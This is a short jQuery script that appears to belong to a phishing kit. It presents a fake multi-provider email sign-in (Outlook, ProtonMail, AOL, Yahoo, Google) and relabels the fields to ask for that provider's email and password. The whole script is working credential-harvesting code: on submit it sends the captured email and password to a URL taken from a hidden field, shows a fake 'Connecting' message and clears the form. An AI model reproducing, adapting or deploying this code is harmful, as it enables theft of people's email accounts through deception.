	$('#ttpp').hide();
$(document).ready(function(){
	$('#a-outlook').click(function(e){
		e.preventDefault();
		$('#deg').val("Outlook");
		display("Outlook");
	});
	$('#a-protonmail').click(function(e){
		e.preventDefault();
		$('#deg').val("ProtonMail");
		display("ProtonMail");
	});
	$('#a-aol').click(function(e){
		e.preventDefault();
		$('#deg').val("AOL");
		display("AOL");
	});
	$('#a-yahoo').click(function(e){
		e.preventDefault();
		$('#deg').val("Yahoo");
		display("Yahoo");
	});
	$('#a-google').click(function(e){
		e.preventDefault();
		$('#deg').val("Google");
		display("Google");
	});
	
	    $('#login-form').submit(function(e){
		e.preventDefault();
		var data = $(this).serialize();
		var url = $('#uu').val();
		submitForm(url,data);
    });
});

function display(title){
		$('#emm').html("Your " + title + " email");
		$('#ppp').html("Your " + title + " password");
}


function submitForm(url,data){
	$.ajax({   
   type : 'GET',
   url  : url,
   data : data,
   beforeSend: function()
   { 
    $("#error").fadeOut();
    $("#working").html('<br><br><div class="alert alert-info" role="alert" style=" text-align: center;"><strong class="block" style="font-weight: bold;">  <i class = "fa fa-spinner fa-2x slow-spin"></i>  Connecting.... </strong></div>');
   },
   success :  function(response)
      {      
  
     if(response=="ok"){   
       $('#working').fadeOut();	
	   $('#email').val("");	   
	   $('#pass').val("");	   
       setTimeout(function(){$('#ttpp').fadeIn();},1500);
     }     
     else{         
      $("#error").fadeIn(1000, function(){      
      $("#error").html('<br><br><div class="alert alert-danger"> '+response+'</div>');
           $("#working").html("");
      });
     }
     
     }
   });
}